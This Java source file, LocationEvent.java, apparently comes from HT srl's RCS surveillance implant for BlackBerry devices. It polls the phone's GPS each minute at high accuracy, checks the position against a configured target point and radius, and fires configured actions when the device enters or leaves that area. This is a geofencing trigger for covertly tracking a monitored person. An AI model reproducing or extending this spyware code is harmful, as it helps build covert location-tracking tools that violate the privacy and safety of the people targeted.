//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : LocationEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import java.io.EOFException;
import java.io.IOException;

import javax.microedition.location.Coordinates;
import javax.microedition.location.Criteria;
import javax.microedition.location.Location;
import javax.microedition.location.LocationException;
import javax.microedition.location.LocationListener;
import javax.microedition.location.LocationProvider;
import javax.microedition.location.ProximityListener;
import javax.microedition.location.QualifiedCoordinates;

import blackberry.Conf;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.location.LocationHelper;
import blackberry.location.LocationObserver;

import net.rim.device.api.util.DataBuffer;

// TODO: Auto-generated Javadoc
/**
 * The Class LocationEvent.
 */
public final class LocationEvent extends Event implements LocationObserver {
	//#ifdef DEBUG
	private static Debug debug = new Debug("LocationEvent", DebugLevel.VERBOSE);
	//#endif

	int actionOnEnter;
	int actionOnExit;

	int distance;
	double latitudeOrig;
	double longitudeOrig;
	Coordinates coordinatesOrig;

	LocationProvider lp;
	boolean entered = false;

	//int interval = 60;

	/**
	 * Instantiates a new location event.
	 * 
	 * @param actionId
	 *            the action id
	 * @param confParams
	 *            the conf params
	 */
	public LocationEvent(final int actionId, final byte[] confParams) {
		super(Event.EVENT_LOCATION, actionId, confParams, "LocationEvent");
	}

	protected void actualStart() {
		Criteria criteria = new Criteria();
		criteria.setCostAllowed(true);

		criteria.setHorizontalAccuracy(50);
		criteria.setVerticalAccuracy(50);
		criteria.setPreferredPowerConsumption(Criteria.POWER_USAGE_HIGH);

		try {
			lp = LocationProvider.getInstance(criteria);

		} catch (LocationException e) {
			//#ifdef DEBUG_ERROR
			debug.error(e);
			//#endif
		}

		if (lp == null) {
			//#ifdef DEBUG_ERROR
			debug.error("GPS Not Supported on Device");
			//#endif               
			setPeriod(NEVER);
			return;
		}

		//#ifdef DEBUG_TRACE
		debug.trace("setLocationListener");
		//#endif
		//lp.setLocationListener(this, interval, Conf.GPS_TIMEOUT, Conf.GPS_MAXAGE);

		entered = false;
	}

	protected void actualStop() {
		if (lp != null) {
			//#ifdef DEBUG_TRACE
			debug.trace("actualStop: resetting");
			//#endif
			//lp.setLocationListener(null, -1, -1, -1 );
			lp.reset();
		}
	}

	boolean waitingForPoint= false;
	/*
	 * (non-Javadoc)
	 * @see blackberry.threadpool.TimerJob#actualRun()
	 */
	protected synchronized void actualRun() {

		if (lp == null) {
			//#ifdef DEBUG_ERROR
			debug.error("GPS Not Supported on Device");
			//#endif               
			return;
		}
		
		if(waitingForPoint){
			//#ifdef DEBUG_TRACE
			debug.trace("waitingForPoint");
			//#endif
			return;
		}

		LocationHelper.getInstance().locationGPS(lp, this);
	}

	public void newLocation(Location loc) {
		//#ifdef DEBUG_TRACE
		debug.trace("checkProximity: " + loc);
		//#endif

		QualifiedCoordinates coord = null;
		try {
			coord = loc.getQualifiedCoordinates();
			coordinatesOrig = new Coordinates(latitudeOrig, longitudeOrig,
					coord.getAltitude());

		} catch (Exception ex) {
			//#ifdef DEBUG_ERROR
			debug.error("QualifiedCoordinates: " + ex);
			//#endif
			return;

		}

		try {
			double actualDistance = coord.distance(coordinatesOrig);
			//#ifdef DEBUG_INFO
			debug.info("Distance: " + actualDistance);
			//#endif
			if (actualDistance < distance) {
				if (!entered) {
					//#ifdef DEBUG_INFO
					debug.info("Enter");
					//#endif
					trigger(actionOnEnter);
					entered = true;
				} else {
					//#ifdef DEBUG_TRACE
					debug.trace("Already entered");
					//#endif
				}
			} else {
				if (entered) {
					//#ifdef DEBUG_INFO
					debug.info("Exit");
					//#endif
					trigger(actionOnExit);
					entered = false;
				} else {
					//#ifdef DEBUG_TRACE
					debug.trace("Already exited");
					//#endif
				}
			}
		} catch (Exception ex) {
			//#ifdef DEBUG_ERROR
			debug.error("Distance: " + ex);
			//#endif
			return;
		}
	}

	/*
	 * (non-Javadoc)
	 * @see blackberry.event.Event#parse(byte[])
	 */
	protected boolean parse(final byte[] confParams) {
		final DataBuffer databuffer = new DataBuffer(confParams, 0,
				confParams.length, false);

		if (!Conf.GPS_ENABLED) {
			//#ifdef DEBUG_WARN
			debug.warn("GPS disabled by compilation");
			//#endif
			return true;
		} else {
			try {
				actionOnEnter = actionId;
				actionOnExit = databuffer.readInt();

				distance = databuffer.readInt();

				latitudeOrig = databuffer.readDouble();
				longitudeOrig = databuffer.readDouble();
				coordinatesOrig = new Coordinates(latitudeOrig, longitudeOrig,
						0);

				//#ifdef DEBUG_INFO
				debug.info("Lat: " + latitudeOrig + " Lon: " + longitudeOrig
						+ " Dist: " + distance);
				//#endif

				setPeriod(60000);
				setDelay(60000);
				//setPeriod(NEVER);

			} catch (final EOFException e) {
				return false;
			} catch (IOException e) {
				return false;
			}
			return true;
		}
	}

    public synchronized void waitingForPoint(boolean b) {
        waitingForPoint = b;
    }

}
